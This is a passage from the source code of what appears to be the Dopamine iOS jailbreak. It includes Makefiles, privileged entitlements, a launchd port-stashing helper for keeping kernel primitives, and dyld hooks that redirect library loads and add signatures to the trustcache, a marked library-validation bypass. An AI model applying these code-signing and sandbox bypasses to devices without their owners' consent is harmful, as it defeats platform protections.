                            _$s7ellekit8RegisterO3w13ACvgZ,
                            _$s7ellekit8RegisterO3w13ACvpZ,
                            _$s7ellekit8RegisterO3w14ACvau,
                            _$s7ellekit8RegisterO3w14ACvgZ,
                            _$s7ellekit8RegisterO3w14ACvpZ,
                            _$s7ellekit8RegisterO3w15ACvau,
                            _$s7ellekit8RegisterO3w15ACvgZ,
                            _$s7ellekit8RegisterO3w15ACvpZ,
                            _$s7ellekit8RegisterO3w16ACvau,
                            _$s7ellekit8RegisterO3w16ACvgZ,
                            _$s7ellekit8RegisterO3w16ACvpZ,
                            _$s7ellekit8RegisterO3w17ACvau,
                            _$s7ellekit8RegisterO3w17ACvgZ,
                            _$s7ellekit8RegisterO3w17ACvpZ,
                            _$s7ellekit8RegisterO3w18ACvau,
                            _$s7ellekit8RegisterO3w18ACvgZ,
                            _$s7ellekit8RegisterO3w18ACvpZ,
                            _$s7ellekit8RegisterO3w19ACvau,
                            _$s7ellekit8RegisterO3w19ACvgZ,
                            _$s7ellekit8RegisterO3w19ACvpZ,
                            _$s7ellekit8RegisterO3w20ACvau,
                            _$s7ellekit8RegisterO3w20ACvgZ,
                            _$s7ellekit8RegisterO3w20ACvpZ,
                            _$s7ellekit8RegisterO3w21ACvau,
                            _$s7ellekit8RegisterO3w21ACvgZ,
                            _$s7ellekit8RegisterO3w21ACvpZ,
                            _$s7ellekit8RegisterO3w22ACvau,
                            _$s7ellekit8RegisterO3w22ACvgZ,
                            _$s7ellekit8RegisterO3w22ACvpZ,
                            _$s7ellekit8RegisterO3w23ACvau,
                            _$s7ellekit8RegisterO3w23ACvgZ,
                            _$s7ellekit8RegisterO3w23ACvpZ,
                            _$s7ellekit8RegisterO3w24ACvau,
                            _$s7ellekit8RegisterO3w24ACvgZ,
                            _$s7ellekit8RegisterO3w24ACvpZ,
                            _$s7ellekit8RegisterO3w25ACvau,
                            _$s7ellekit8RegisterO3w25ACvgZ,
                            _$s7ellekit8RegisterO3w25ACvpZ,
                            _$s7ellekit8RegisterO3w26ACvau,
                            _$s7ellekit8RegisterO3w26ACvgZ,
                            _$s7ellekit8RegisterO3w26ACvpZ,
                            _$s7ellekit8RegisterO3w27ACvau,
                            _$s7ellekit8RegisterO3w27ACvgZ,
                            _$s7ellekit8RegisterO3w27ACvpZ,
                            _$s7ellekit8RegisterO3w28ACvau,
                            _$s7ellekit8RegisterO3w28ACvgZ,
                            _$s7ellekit8RegisterO3w28ACvpZ,
                            _$s7ellekit8RegisterO3w29ACvau,
                            _$s7ellekit8RegisterO3w29ACvgZ,
                            _$s7ellekit8RegisterO3w29ACvpZ,
                            _$s7ellekit8RegisterO3w30ACvau,
                            _$s7ellekit8RegisterO3w30ACvgZ,
                            _$s7ellekit8RegisterO3w30ACvpZ,
                            _$s7ellekit8RegisterO3x10ACvau,
                            _$s7ellekit8RegisterO3x10ACvgZ,
                            _$s7ellekit8RegisterO3x10ACvpZ,
                            _$s7ellekit8RegisterO3x11ACvau,
                            _$s7ellekit8RegisterO3x11ACvgZ,
                            _$s7ellekit8RegisterO3x11ACvpZ,
                            _$s7ellekit8RegisterO3x12ACvau,
                            _$s7ellekit8RegisterO3x12ACvgZ,
                            _$s7ellekit8RegisterO3x12ACvpZ,
                            _$s7ellekit8RegisterO3x13ACvau,
                            _$s7ellekit8RegisterO3x13ACvgZ,
                            _$s7ellekit8RegisterO3x13ACvpZ,
                            _$s7ellekit8RegisterO3x14ACvau,
                            _$s7ellekit8RegisterO3x14ACvgZ,
                            _$s7ellekit8RegisterO3x14ACvpZ,
                            _$s7ellekit8RegisterO3x15ACvau,
                            _$s7ellekit8RegisterO3x15ACvgZ,
                            _$s7ellekit8RegisterO3x15ACvpZ,
                            _$s7ellekit8RegisterO3x16ACvau,
                            _$s7ellekit8RegisterO3x16ACvgZ,
                            _$s7ellekit8RegisterO3x16ACvpZ,
                            _$s7ellekit8RegisterO3x17ACvau,
                            _$s7ellekit8RegisterO3x17ACvgZ,
                            _$s7ellekit8RegisterO3x17ACvpZ,
                            _$s7ellekit8RegisterO3x18ACvau,
                            _$s7ellekit8RegisterO3x18ACvgZ,
                            _$s7ellekit8RegisterO3x18ACvpZ,
                            _$s7ellekit8RegisterO3x19ACvau,
                            _$s7ellekit8RegisterO3x19ACvgZ,
                            _$s7ellekit8RegisterO3x19ACvpZ,
                            _$s7ellekit8RegisterO3x20ACvau,
                            _$s7ellekit8RegisterO3x20ACvgZ,
                            _$s7ellekit8RegisterO3x20ACvpZ,
                            _$s7ellekit8RegisterO3x21ACvau,
                            _$s7ellekit8RegisterO3x21ACvgZ,
                            _$s7ellekit8RegisterO3x21ACvpZ,
                            _$s7ellekit8RegisterO3x22ACvau,
                            _$s7ellekit8RegisterO3x22ACvgZ,
                            _$s7ellekit8RegisterO3x22ACvpZ,
                            _$s7ellekit8RegisterO3x23ACvau,
                            _$s7ellekit8RegisterO3x23ACvgZ,
                            _$s7ellekit8RegisterO3x23ACvpZ,
                            _$s7ellekit8RegisterO3x24ACvau,
                            _$s7ellekit8RegisterO3x24ACvgZ,
                            _$s7ellekit8RegisterO3x24ACvpZ,
                            _$s7ellekit8RegisterO3x25ACvau,
                            _$s7ellekit8RegisterO3x25ACvgZ,
                            _$s7ellekit8RegisterO3x25ACvpZ,
                            _$s7ellekit8RegisterO3x26ACvau,
                            _$s7ellekit8RegisterO3x26ACvgZ,
                            _$s7ellekit8RegisterO3x26ACvpZ,
                            _$s7ellekit8RegisterO3x27ACvau,
                            _$s7ellekit8RegisterO3x27ACvgZ,
                            _$s7ellekit8RegisterO3x27ACvpZ,
                            _$s7ellekit8RegisterO3x28ACvau,
                            _$s7ellekit8RegisterO3x28ACvgZ,
                            _$s7ellekit8RegisterO3x28ACvpZ,
                            _$s7ellekit8RegisterO3x29ACvau,
                            _$s7ellekit8RegisterO3x29ACvgZ,
                            _$s7ellekit8RegisterO3x29ACvpZ,
                            _$s7ellekit8RegisterO3x30ACvau,
                            _$s7ellekit8RegisterO3x30ACvgZ,
                            _$s7ellekit8RegisterO3x30ACvpZ,
                            _$s7ellekit8RegisterOMa, _$s7ellekit8RegisterOMn,
                            _$s7ellekit8RegisterON,
                            _$s7ellekit8hookIvarySpyxGSgyXlXp_SStlF,
                            _$s7ellekit9openImage5imageSPySo11mach_headerVGSgSS_tKF,
                            _$sSv7ellekitE12makeCallableSvyF,
                            _$sSv7ellekitE12makeReadableSvyF,
                            _$sSv7ellekitE13opaquePointers06OpaqueC0VyF,
                            _EKEnableThreadSafety, _LBHookMessage, _LHExecMemory,
                            _LHHookFunctions, _LHPatchMemory, _LHStrError,
                            _MSFindSymbol, _MSGetImageByName, _MSHookClassPair,
                            _MSHookFunction, _MSHookIvar, _MSHookMemory,
                            _MSHookMessageEx, _sign_pc, _sign_pointer,
                            _strip_pointer ]
...

```

`BaseBin/boomerang/Makefile`:

```
TARGET = boomerang

CC = clang

CFLAGS = -framework Foundation -framework CoreServices -framework Security -I../.include -I./src -isysroot $(shell xcrun --sdk iphoneos --show-sdk-path) -arch arm64 -arch arm64e -miphoneos-version-min=15.0 -fobjc-arc -Wno-nullability-completeness-on-arrays -O2
LDFLAGS = -L../.build -ljailbreak

sign: $(TARGET)
	@ldid -Sentitlements.plist $<

$(TARGET): $(wildcard src/*.c)
	$(CC) $(CFLAGS) $(LDFLAGS) -o $@ $^

clean:
	@rm -f $(TARGET)

```

`BaseBin/boomerang/entitlements.plist`:

```plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>platform-application</key>
	<true/>
	<key>com.apple.private.security.no-container</key>
	<true/>
	<key>task_for_pid-allow</key>
	<true/>
	<key>com.apple.system-task-ports</key>
	<true/>
	<key>com.apple.security.exception.iokit-user-client-class</key>
	<array>
		<string>IOSurfaceRootUserClient</string>
	</array>
</dict>
</plist>

```

`BaseBin/boomerang/src/main.c`:

```c
#include <mach/mach.h>
#include <libjailbreak/primitives.h>
#include <libjailbreak/libjailbreak.h>
#include <libjailbreak/physrw.h>
#include <libjailbreak/physrw_pte.h>
#include <libjailbreak/primitives_IOSurface.h>
#include <libjailbreak/kalloc_pt.h>
#include <libjailbreak/kcall_Fugu14.h>
#include <libjailbreak/kcall_arm64.h>
#include <libjailbreak/jbserver_boomerang.h>

int main(int argc, char* argv[])
{
	setsid();

	__block bool launchdHasPhysrw = false;
	__block bool launchdHasKcall = false;

	mach_port_t serverPort = MACH_PORT_NULL;
	mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &serverPort);
	mach_port_insert_right(mach_task_self(), serverPort, serverPort, MACH_MSG_TYPE_MAKE_SEND);

	// Boomerang server that launchd after the userspace reboot will use to recover the primitives
	dispatch_source_t serverSource = dispatch_source_create(DISPATCH_SOURCE_TYPE_MACH_RECV, (uintptr_t)serverPort, 0, dispatch_get_main_queue());
	dispatch_source_set_event_handler(serverSource, ^{
		xpc_object_t xdict = NULL;
		if (!xpc_pipe_receive(serverPort, &xdict)) {
			if (jbserver_received_boomerang_xpc_message(&gBoomerangServer, xdict) == JBS_BOOMERANG_DONE) {
				dispatch_source_cancel(serverSource);
				mach_port_deallocate(mach_task_self(), serverPort);
				exit(0);
			}
			xpc_release(xdict);
		}
	});
	dispatch_resume(serverSource);

	// When spawning, launchd should have stored a port to it's server in boomerang's registeredPorts[2]
	// Initialize jbclient with that
	mach_port_t *registeredPorts;
	mach_msg_type_number_t registeredPortsCount = 0;
	if (mach_ports_lookup(mach_task_self(), &registeredPorts, &registeredPortsCount) != 0 || registeredPortsCount < 3) return -1;
	jbclient_xpc_set_custom_port(registeredPorts[2]);

	// Stash our server port inside launchd's registeredPorts[2]
	task_t launchdTaskPort = MACH_PORT_NULL;
	kern_return_t kr = task_for_pid(mach_task_self(), 1, &launchdTaskPort);
	if (kr != KERN_SUCCESS || launchdTaskPort == MACH_PORT_NULL) return -1;
	kr = mach_ports_register(launchdTaskPort, (mach_port_t[]){ MACH_PORT_NULL, MACH_PORT_NULL, serverPort }, 3);
	if (kr != KERN_SUCCESS) return -1;
	mach_port_deallocate(mach_task_self(), launchdTaskPort);

	// Retrieve primitives
	jbclient_initialize_primitives_internal(false);

	// Send done message to launchd
	jbclient_boomerang_done();

	// Now make our server run so that launchd can get everything back
	dispatch_main();
	return 0;
}
```

`BaseBin/dyldhook/Makefile`:

```
CC = clang

CFLAGS = -I../.include -isysroot $(shell xcrun --sdk iphoneos --show-sdk-path) -miphoneos-version-min=15.0 -Wno-deprecated-declarations -fno-stack-check -D_FORTIFY_SOURCE=0 -O2
LDFLAGS = -shared -Xlinker -add_split_seg_info
FILES = $(wildcard src/*.c src/*.S ../libjailbreak/src/jbclient_mach.c)
FILES_IOS15 = $(wildcard src/generated/ios15/*.c)
FILES_IOS16 = $(wildcard src/generated/ios16/*.c)

all: dyldhook_merge.arm64e.dylib dyldhook_merge.arm64e.iOS15.dylib dyldhook_merge.arm64.dylib dyldhook_merge.arm64.iOS15.dylib

dyldhook_merge.arm64e.dylib: $(FILES) $(FILES_IOS16)
	$(CC) -arch arm64e $(CFLAGS) -DIOS=16 $(LDFLAGS) -o $@ $^
	@ldid -S $@

dyldhook_merge.arm64e.iOS15.dylib: $(FILES) $(FILES_IOS15)
	$(CC) -arch arm64e $(CFLAGS) -DIOS=15 $(LDFLAGS) -o $@ $^
	@ldid -S $@

dyldhook_merge.arm64.dylib: $(FILES) $(FILES_IOS16)
	$(CC) -arch arm64 $(CFLAGS) -DIOS=16 $(LDFLAGS) -o $@ $^
	@ldid -S $@

dyldhook_merge.arm64.iOS15.dylib: $(FILES) $(FILES_IOS15)
	$(CC) -arch arm64 $(CFLAGS) -DIOS=15 $(LDFLAGS) -o $@ $^
	@ldid -S $@

clean:
	@rm -f dyldhook_merge.arm64e.dylib
	@rm -f dyldhook_merge.arm64e.iOS15.dylib
	@rm -f dyldhook_merge.arm64.dylib
	@rm -f dyldhook_merge.arm64.iOS15.dylib

```

`BaseBin/dyldhook/src/dyld.h`:

```h
const char *_simple_getenv(char **envp, char *key);
uint64_t msyscall_errno(uint64_t syscall, ...);
```

`BaseBin/dyldhook/src/dyld_jbinfo.h`:

```h
#define DYLD_JBINFO_MAXSIZE 0x4000

#define DYLD_STATE_CHECKED_IN 1

// A struct that allows dyldhook to stash information that systemhook can later access
struct dyld_jbinfo {
	uint64_t state;
	char *jbRootPath;
	char *bootUUID;
	char *sandboxExtensions;
	bool fullyDebugged;

	char data[];
};

extern bool jbinfo_is_checked_in(void);
extern char *jbinfo_get_jbroot(void);
```

`BaseBin/dyldhook/src/fakelib_redirect.c`:

```c
#include <stdint.h>
#include <stdbool.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sandbox.h>
#include <fcntl.h>
#include <limits.h>
#include <stdio.h>
#include <sys/mman.h>

#include "machomerger_hook.h"
#include "dyld_jbinfo.h"
#include "dyld.h"

// When hiding the jailbreak in Dopamine settings, a lot of processes will crash due to the /usr/lib mount disappearing
// Anything that has libraries inside /usr/lib that are not in the shared cache (e.g. libobjc_trampolines.dylib) mapped in will crash
// We solve this here by redirecting dlopen calls for files in /usr/lib to /var/jb/basebin/.fakelib (if the latter is accessible)
// This way the vnode will not be on /usr/lib mount and the /usr/lib mount therefore can be unmounted without making stuff crash
// There are a few rare edge cases of processes that cannot access /var/jb/basebin/.fakelib for some reason, so we need to make sure those still go over /usr/lib

extern void *ORIG(_ZN5dyld44APIs11dlopen_fromEPKciPv)(uintptr_t self, const char* path, int mode, void* addressInCaller);
void *HOOK(_ZN5dyld44APIs11dlopen_fromEPKciPv)(uintptr_t self, const char* path, int mode, void* addressInCaller)
{
	if (jbinfo_is_checked_in()) {
		if (!access(path, F_OK)) {
			const char *orgPrefix = "/usr/lib/";
    		size_t orgPrefixLen = strlen(orgPrefix);
			if (!strncmp(path, orgPrefix, orgPrefixLen)) {
				char *jbroot = jbinfo_get_jbroot();
				if (jbroot) {
					const char *suffix = &path[orgPrefixLen-1];
					const char *middle = "/basebin/.fakelib";

					size_t redirPathSize = strlen(suffix) + strlen(middle) + strlen(jbroot) + 1;
					char redirPath[redirPathSize];
					strcpy(redirPath, jbroot);
					strcat(redirPath, middle);
					strcat(redirPath, suffix);

					void *handle = ORIG(_ZN5dyld44APIs11dlopen_fromEPKciPv)(self, redirPath, mode, addressInCaller);
					if (handle) return handle;

					// If anything failed, fall through
				}
			}
		}
	}

	return ORIG(_ZN5dyld44APIs11dlopen_fromEPKciPv)(self, path, mode, addressInCaller);
}
```

`BaseBin/dyldhook/src/generated/ios15/task.c`:

```c
#include <mach/mach.h>

#define __DeclareSendRpc(...)
#define __BeforeSendRpc(...)
#define __AfterSendRpc(...)
#define __MachMsgErrorWithoutTimeout(...)

#define msgh_request_port    msgh_remote_port
#define msgh_reply_port        msgh_local_port

/* Routine task_get_special_port */
kern_return_t task_get_special_port
(
    task_inspect_t task,
    int which_port,
    mach_port_t *special_port
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        int which_port;
    } Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
    typedef struct {
        mach_msg_header_t Head;
        /* start of the kernel processed data */
        mach_msg_body_t msgh_body;
        mach_msg_port_descriptor_t special_port;
        /* end of the kernel processed data */
        mach_msg_trailer_t trailer;
    } Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
    typedef struct {
        mach_msg_header_t Head;
        /* start of the kernel processed data */
        mach_msg_body_t msgh_body;
        mach_msg_port_descriptor_t special_port;
        /* end of the kernel processed data */
    } __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
    /*
     * typedef struct {
     *     mach_msg_header_t Head;
     *     NDR_record_t NDR;
     *     kern_return_t RetCode;
     * } mig_reply_error_t;
     */

    union {
        Request In;
        Reply Out;
    } Mess;

    Request *InP = &Mess.In;
    Reply *Out0P = &Mess.Out;

    mach_msg_return_t msg_result;

#ifdef    __MIG_check__Reply__task_get_special_port_t__defined
    kern_return_t check_result;
#endif    /* __MIG_check__Reply__task_get_special_port_t__defined */

    __DeclareSendRpc(3409, "task_get_special_port")

    // XXX: had to comment this out because we don't have NDR_record
    //InP->NDR = NDR_record;

    InP->which_port = which_port;

    InP->Head.msgh_reply_port = mig_get_reply_port();
    InP->Head.msgh_bits =
        MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    /* msgh_size passed as argument */
    InP->Head.msgh_request_port = task;
    InP->Head.msgh_id = 3409;
    InP->Head.msgh_reserved = 0;
    
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
    if (voucher_mach_msg_set != NULL) {
        voucher_mach_msg_set(&InP->Head);
    }
#endif // USING_VOUCHERS
    
/* END VOUCHER CODE */

    __BeforeSendRpc(3409, "task_get_special_port")
    msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    __AfterSendRpc(3409, "task_get_special_port")
    if (msg_result != MACH_MSG_SUCCESS) {
        __MachMsgErrorWithoutTimeout(msg_result);
    }
    if (msg_result != MACH_MSG_SUCCESS) {
        { return msg_result; }
    }


#if    defined(__MIG_check__Reply__task_get_special_port_t__defined)
    check_result = __MIG_check__Reply__task_get_special_port_t((__Reply__task_get_special_port_t *)Out0P);
    if (check_result != MACH_MSG_SUCCESS) {
        mach_msg_destroy(&Out0P->Head);
        { return check_result; }
    }
#endif    /* defined(__MIG_check__Reply__task_get_special_port_t__defined) */

    *special_port = Out0P->special_port.name;
    return KERN_SUCCESS;
}

```

`BaseBin/dyldhook/src/generated/ios16/task.c`:

```c
#include <mach/mach.h>

#define __DeclareSendRpc(...)
#define __BeforeSendRpc(...)
#define __AfterSendRpc(...)
#define __MachMsgErrorWithoutTimeout(...)

typedef uint64_t mach_msg_option64_t;

mach_msg_return_t
mach_msg2(
	void *data,
	mach_msg_option64_t option64,
	mach_msg_header_t header,
	mach_msg_size_t send_size,
	mach_msg_size_t rcv_size,
	mach_port_t rcv_name,
	uint64_t timeout,
	uint32_t priority);

#define MACH64_SEND_KOBJECT_CALL 0x0000000200000000ull

#undef mach_msg
#define mach_msg mig_mach_msg
static inline mach_msg_return_t
mig_mach_msg(
	mach_msg_header_t *msg,
	mach_msg_option_t option,
	mach_msg_size_t send_size,
	mach_msg_size_t rcv_size,
	mach_port_name_t rcv_name,
	mach_msg_timeout_t timeout,
	mach_port_name_t notify)
{
	(void)notify;
	return mach_msg2(msg, option | MACH64_SEND_KOBJECT_CALL,
		*msg, send_size, rcv_size, rcv_name, timeout, 0);
}

#define msgh_request_port    msgh_remote_port
#define msgh_reply_port        msgh_local_port

/* Routine task_get_special_port */
kern_return_t task_get_special_port
(
	task_inspect_t task,
	int which_port,
	mach_port_t *special_port
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		int which_port;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t special_port;
		/* end of the kernel processed data */
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t special_port;
		/* end of the kernel processed data */
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_get_special_port_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_get_special_port_t__defined */

	__DeclareSendRpc(3409, "task_get_special_port")

    // XXX: had to comment this out because we don't have NDR_record
    //InP->NDR = NDR_record;

	InP->which_port = which_port;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	InP->Head.msgh_size = (mach_msg_size_t)sizeof(Request);
	InP->Head.msgh_request_port = task;
	InP->Head.msgh_id = 3409;
	InP->Head.msgh_reserved = 0;

	__BeforeSendRpc(3409, "task_get_special_port")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3409, "task_get_special_port")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_get_special_port_t__defined)
	check_result = __MIG_check__Reply__task_get_special_port_t((__Reply__task_get_special_port_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_get_special_port_t__defined) */

	*special_port = Out0P->special_port.name;
	return KERN_SUCCESS;
}
```

`BaseBin/dyldhook/src/lv_bypass.c`:

```c
#include <stdint.h>
#include <stdbool.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sandbox.h>
#include <fcntl.h>
#include <limits.h>
#include <stdio.h>
#include <sys/mman.h>

#include "machomerger_hook.h"
#include "dyld_jbinfo.h"
#include "dyld.h"

#include <libjailbreak/jbclient_mach.h>

// Library validation bypass
// Dyld will call fcntl to attach a code signature to a dylib before mapping it in
// So we hook fcntl to ensure the code signature to be attached is added to trustcache

int HOOK(__fcntl)(int fd, int cmd, void *arg1, void *arg2, void *arg3, void *arg4, void *arg5, void *arg6, void *arg7, void *arg8)
{
	switch (cmd) {
		case F_ADDSIGS:
		case F_ADDFILESIGS:
		case F_ADDFILESIGS_RETURN: {
			struct siginfo siginfo;
			siginfo.source = (cmd == F_ADDSIGS) ? SIGNATURE_SOURCE_PROC : SIGNATURE_SOURCE_FILE;
			if (arg1) memcpy(&siginfo.signature, (fsignatures_t *)arg1, sizeof (fsignatures_t));
			jbclient_mach_trust_file(fd, arg1 ? &siginfo : NULL);
			break;
		}
	}
	return (int)msyscall_errno(0x5C, fd, cmd, arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8);
}
```

`BaseBin/dyldhook/src/machomerger_hook.h`:

```h
#ifndef __MACHOMERGER_HOOK_H
#define __MACHOMERGER_HOOK_H

#define HOOK(name) MACHOMERGER_HOOK_##name
#define ORIG(name) MACHOMERGER_ORIG_##name

#endif
```

`BaseBin/dyldhook/src/main.S`:

```S
#define MAKE_TRAMPOLINE_ALIAS(to, alias) .global _##alias %% .global _MACHOMERGER_TRAMPOLINE_##to## %% _##alias: %% _MACHOMERGER_TRAMPOLINE_##to##: %% b .
#define MAKE_TRAMPOLINE(to) MAKE_TRAMPOLINE_ALIAS(to, to)

#define SYSCALL_PROLOGUE stp x0, x1, [sp, -16]! %% stp x2, x3, [sp, -16]! %% stp x4, x5, [sp, -16]! %% stp x6, x7, [sp, -16]!
#define SYSCALL_EPILOGUE ldp x6, x7, [sp], 16 %% ldp x4, x5, [sp], 16 %% ldp x2, x3, [sp], 16 %% ldp x0, x1, [sp], 16

#define DEF_SYSCALL(name, num)  .global _##name %% _##name: %% SYSCALL_PROLOGUE %% mov x16, num %% svc #0x80 %% mov x16, x0 %% SYSCALL_EPILOGUE %% bcc name##_end %% cmp x16, #4 %% beq _##name %% mov x16, #-1 %% name##_end: %% mov x0, x16 %% ret
#define DEF_MACHTRAP(name, num) .global _##name %% _##name: %% mov x16, -num %% svc #0x80 %% ret
#define DEF_ALIAS(to, from) .global _##to %% _##to: %% b _##from

.text
.align 4

.global _MACHOMERGER_START_HOOK
_MACHOMERGER_START_HOOK:
    // Copy-Paste from dyld
    mov    x0, sp
    mov    x19, sp
    and    sp, x0, #~15 // force 16-byte alignment of stack
    mov    fp, #0

    // Call init
    bl _dyldhook_init

    // Restore stack
    mov sp, x19

    // Jump to real start
    b _MACHOMERGER_REAL_START

#if IOS==15 && __arm64e__

.global _MACHOMERGER_ORIG__ZN5dyld313loadDyldCacheERKNS_18SharedCacheOptionsEPNS_19SharedCacheLoadInfoE
.global _MACHOMERGER_HOOKTRAMPOLINE__ZN5dyld313loadDyldCacheERKNS_18SharedCacheOptionsEPNS_19SharedCacheLoadInfoE
_MACHOMERGER_ORIG__ZN5dyld313loadDyldCacheERKNS_18SharedCacheOptionsEPNS_19SharedCacheLoadInfoE:
    nop // Will be replaced with the original first instruction by machomerger
    // FALLTHROUGH
_MACHOMERGER_HOOKTRAMPOLINE__ZN5dyld313loadDyldCacheERKNS_18SharedCacheOptionsEPNS_19SharedCacheLoadInfoE:
    b . // Will be patched by machomerger

#endif

.global _MACHOMERGER_ORIG__ZN5dyld44APIs11dlopen_fromEPKciPv
.global _MACHOMERGER_HOOKTRAMPOLINE__ZN5dyld44APIs11dlopen_fromEPKciPv
_MACHOMERGER_ORIG__ZN5dyld44APIs11dlopen_fromEPKciPv:
    nop // Will be replaced with the original first instruction by machomerger
    // FALLTHROUGH
_MACHOMERGER_HOOKTRAMPOLINE__ZN5dyld44APIs11dlopen_fromEPKciPv:
    b .

MAKE_TRAMPOLINE(MACHOMERGER_REAL_START)
MAKE_TRAMPOLINE(cerror)
MAKE_TRAMPOLINE_ALIAS(__getpid, getpid)
MAKE_TRAMPOLINE_ALIAS(__bzero, bzero)
MAKE_TRAMPOLINE(mach_msg_destroy)
MAKE_TRAMPOLINE(mach_reply_port)
MAKE_TRAMPOLINE(mach_port_construct)
MAKE_TRAMPOLINE(mach_port_deallocate)
MAKE_TRAMPOLINE(memset)
MAKE_TRAMPOLINE(task_self_trap)
MAKE_TRAMPOLINE(__stack_chk_fail)
MAKE_TRAMPOLINE_ALIAS(_kernelrpc_mach_vm_allocate_trap, vm_allocate)
MAKE_TRAMPOLINE_ALIAS(_kernelrpc_mach_vm_deallocate_trap, vm_deallocate)
MAKE_TRAMPOLINE(vm_protect)
MAKE_TRAMPOLINE(memcpy)
MAKE_TRAMPOLINE(strcmp)
MAKE_TRAMPOLINE(strncmp)
MAKE_TRAMPOLINE(strlen)
MAKE_TRAMPOLINE(strstr)
MAKE_TRAMPOLINE(strcpy)
MAKE_TRAMPOLINE(strcat)
MAKE_TRAMPOLINE(close)
MAKE_TRAMPOLINE(open)
MAKE_TRAMPOLINE(fcntl)
MAKE_TRAMPOLINE(mmap)
MAKE_TRAMPOLINE(_simple_getenv)
MAKE_TRAMPOLINE_ALIAS(mig_get_reply_port, dyld_mig_get_reply_port)

#if IOS>=16
MAKE_TRAMPOLINE(mach_msg_overwrite)
MAKE_TRAMPOLINE(mach_msg2_internal)
#else
MAKE_TRAMPOLINE(mach_msg)
#endif

DEF_SYSCALL(read, 3)
DEF_SYSCALL(access, 33)
DEF_SYSCALL(lseek, 199)
DEF_SYSCALL(__sandbox_ms, 381)
DEF_SYSCALL(fileport_makeport, 430)

.data
.global ___stack_chk_guard
___stack_chk_guard:
    .quad 0x1337
```

`BaseBin/dyldhook/src/main.c`:

```c
#include <stdint.h>
#include <stdbool.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sandbox.h>
#include <libjailbreak/jbclient_mach.h>

#include "dyld.h"
#include "dyld_jbinfo.h"

__attribute__((section("__DATA,__jbinfo"))) static char jbinfoSection[0x4000];
#define jbInfo ((struct dyld_jbinfo *)&jbinfoSection[0])

bool gDyldhookInitDone = false;

bool jbinfo_is_checked_in(void)
{
	return jbInfo->state == DYLD_STATE_CHECKED_IN;
}

char *jbinfo_get_jbroot(void)
{
	return jbInfo->jbRootPath;
}

void consume_tokenized_sandbox_extensions(char *sandboxExtensions)
{
	if (sandboxExtensions[0] == '\0') return;

	char *it = sandboxExtensions;
	char *last = sandboxExtensions;
	while (*(++it) != '\0') {
		if (*it == '|') {
			*it = '\0';
			sandbox_extension_consume(last);
			last = &it[1];
			*it = '|';
		}
	}
	sandbox_extension_consume(last);
}

void dyldhook_perform_checkin(void)
{
	struct jbserver_mach_msg_checkin_reply *replyPtr; // Only for sizeof macro

	char *jbRootPathPtr = &jbInfo->data[0];
	char *bootUUIDPtr = &jbInfo->data[sizeof(replyPtr->jbRootPath)];
	char *sandboxExtensionsPtr = &jbInfo->data[sizeof(replyPtr->jbRootPath)+sizeof(replyPtr->bootUUID)];

	// Tell jbserver (in launchd) that this process exists
	// This will, amongst other things, disable page validation, which allows instruction hooks to be applied later
	if (jbclient_mach_process_checkin(jbRootPathPtr, bootUUIDPtr, sandboxExtensionsPtr, &jbInfo->fullyDebugged) == 0) {
